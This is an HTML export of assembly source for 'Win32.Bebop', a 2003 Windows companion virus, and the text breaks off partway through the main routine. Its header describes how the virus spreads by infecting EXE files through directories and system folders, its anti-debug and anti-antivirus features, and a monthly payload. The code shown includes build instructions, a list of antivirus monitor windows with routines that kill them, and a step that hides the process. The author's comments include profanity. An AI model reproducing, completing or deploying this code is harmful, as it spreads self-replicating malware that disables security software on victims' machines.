<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT#</span><span class="sc0">
</span><span class="sc1">; ____________________________________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;                              Win32.Bebop - Virus [Companion]</span><span class="sc0">
</span><span class="sc1">;                                   coded by -DiA- (c)03</span><span class="sc0">
</span><span class="sc1">;                        GermanY</span><span class="sc0">
</span><span class="sc1">; ____________________________________________________________________________________________</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Intro: </span><span class="sc0">
</span><span class="sc1">;    Yeah! My new creature. This is a Companion Virus (what else?). Ok, I hope you enjoy</span><span class="sc0">
</span><span class="sc1">;    this, and let the CODE speak...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Disclaimer:</span><span class="sc0">
</span><span class="sc1">;    I am NOT responsible for any damage that you do! You can need the code however you want..</span><span class="sc0">
</span><span class="sc1">;    My motherlanguage is not English, I hope you understand what I mean.                      </span><span class="sc0">
</span><span class="sc1">;    Feel FREE to write any Comments to                                                        </span><span class="sc0">
</span><span class="sc1">;                                        DiA_hates_machine@gmx.de</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Infection:</span><span class="sc0">
</span><span class="sc1">;    -infect current directory</span><span class="sc0">
</span><span class="sc1">;    -travel directory's downwards and infect them all</span><span class="sc0">
</span><span class="sc1">;    -go to the Windows folder and infect them</span><span class="sc0">
</span><span class="sc1">;    -go to the Personal folder and infect them</span><span class="sc0">
</span><span class="sc1">;    -infect twenty files per run</span><span class="sc0">
</span><span class="sc1">;    -don't infect again</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Features:</span><span class="sc0">
</span><span class="sc1">;    -Anti-Debug</span><span class="sc0">
</span><span class="sc1">;    -Anti-AV-Monitors</span><span class="sc0">
</span><span class="sc1">;    -Anti-Bait</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Payload:</span><span class="sc0">
</span><span class="sc1">;    -on the first day every month</span><span class="sc0">
</span><span class="sc1">;    -first show a little message</span><span class="sc0">
</span><span class="sc1">;    -after that the cursor is very slow</span><span class="sc0">
</span><span class="sc1">;    -workz with a thread</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Greetz:</span><span class="sc0">
</span><span class="sc1">;    Industry    - m8! See on rRLF 3</span><span class="sc0">
</span><span class="sc1">;    Monochrom   - thanx for TASM32, you see... ;)</span><span class="sc0">
</span><span class="sc1">;    Weed          - thanx for all, my little ganja</span><span class="sc0">
</span><span class="sc1">;    MyCrew      - Next month, HARDCORE at Skatehall! Rock on.</span><span class="sc0">
</span><span class="sc1">;    ??????      - and to the fucker that send me two or three mails: "Be a Internet Million..</span><span class="sc0">
</span><span class="sc1">;                  "  FUCK YOU, YOU STUPID MOTHERFUCKER! Don't send me mail's, Son of a Bitch!</span><span class="sc0">


</span><span class="sc5">First</span><span class="sc0"> </span><span class="sc5">Generation</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;-----cut-----Bebop666.asm---------------------------------------------------------------</span><span class="sc0">
   </span><span class="sc2">.386</span><span class="sc0">
   </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
   </span><span class="sc5">jumps</span><span class="sc0">

   </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

   </span><span class="sc9">.data</span><span class="sc0">
   </span><span class="sc5">oTitle</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Bebop - Virus - First Generation'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">oMsg</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Yo dood, this is only the first generation'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'from the Bebop - Virus. Have fun, now you'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'are infected...'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'     coded by DiA 03 GermanY'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc9">.code</span><span class="sc0">
   </span><span class="sc5">FirstGen</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oTitle</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oMsg</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

   </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">FirstGen</span><span class="sc0">
   </span><span class="sc1">;-----cut--------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">Compile</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">First</span><span class="sc0"> </span><span class="sc5">Gen</span><span class="sc4">-&gt;</span><span class="sc0">
      </span><span class="sc5">TASM32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">z</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">ml</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m3</span><span class="sc0"> </span><span class="sc5">Bebop666</span><span class="sc4">,,</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">TLINK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc10">c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc5">Bebop666</span><span class="sc4">,</span><span class="sc5">Bebop666</span><span class="sc4">,,</span><span class="sc0"> </span><span class="sc5">import32.lib</span><span class="sc0">
      </span><span class="sc5">rename</span><span class="sc0"> </span><span class="sc5">Bebop666.EXE</span><span class="sc0"> </span><span class="sc5">Bebop.SYS</span><span class="sc0">

   </span><span class="sc5">Virus</span><span class="sc0">    </span><span class="sc4">-&gt;</span><span class="sc0">
      </span><span class="sc5">TASM32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">z</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">ml</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m3</span><span class="sc0"> </span><span class="sc5">Bebop</span><span class="sc4">,,</span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">TLINK32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc10">c</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc5">Bebop</span><span class="sc4">,</span><span class="sc5">Bebop</span><span class="sc4">,,</span><span class="sc0"> </span><span class="sc5">import32.lib</span><span class="sc0">

   </span><span class="sc4">[</span><span class="sc5">Bebop.EXE</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">Bebop.SYS</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">Ok</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc12">'s it! I write many comment'</span><span class="sc5">s</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">code...</span><span class="sc0">
    </span><span class="sc5">...HAVE</span><span class="sc0"> </span><span class="sc5">FUN</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0"> </span><span class="sc5">my</span><span class="sc0"> </span><span class="sc5">tut</span><span class="sc13">'s! :)
</span><span class="sc0">
</span><span class="sc5">____________________________________________________________________________________________</span><span class="sc0">
</span><span class="sc5">____________________________________________________________________________________________</span><span class="sc0">
#


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----HEAD----------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Needed API's--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">IsDebuggerPresent</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCursorPos</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetCursorPos</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Nedded DATA's-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.data?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">        </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">          </span><span class="sc9">label</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0">
 </span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">13</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">WFD_szAlternateEnding</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">03</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">wYear</span><span class="sc0">          </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wMonth</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wDayOfWeek</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wDay</span><span class="sc0">               </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wHour</span><span class="sc0">              </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wMinute</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wSecond</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">wMilliseconds</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">POINT</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">x</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">y</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">VirusFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">HostFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">TargetFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ProcessInfo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">PersonalFolder</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WindowsFolder</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">AVP</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">McAfee</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'McAfee VShield'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Solomon</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCAN32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FProt</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FP-WIN'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Norton</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAVAPW32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lpType</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ThreadID</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FileMask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileCounter</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc9">Size</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0">

</span><span class="sc5">ShellFolders</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Personal</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Personal'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">oTitle</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Bebop - Virus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oMsg</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Yeah! Bebop get''s you. Don''t be angry, this nice'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Virus don''t have any DESTRUCTIVE CODE!'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Or for stupid people: Wait a while, next day the'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bebop-Virus go away...'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'   Win32.Bebop coded by DiA (c)2003 [GermanY]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Win32.Bebop starts--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">Bebop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Fuck some AV-Monitors-----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">           </span><span class="sc1">;check for debugger</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AVP</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillMonitor</span><span class="sc0">            </span><span class="sc1">;kill the window</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">McAfee</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillMonitor</span><span class="sc0">            </span><span class="sc1">;kill the window</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Solomon</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillMonitor</span><span class="sc0">            </span><span class="sc1">;kill the window</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FProt</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillMonitor</span><span class="sc0">            </span><span class="sc1">;kill the window</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Norton</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KillMonitor</span><span class="sc0">            </span><span class="sc1">;kill the window</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Hide the Bebop Process----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">        </span><span class="sc1">;get id to hide the Bebop</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;register as "SystemService"</span><span class="sc0">
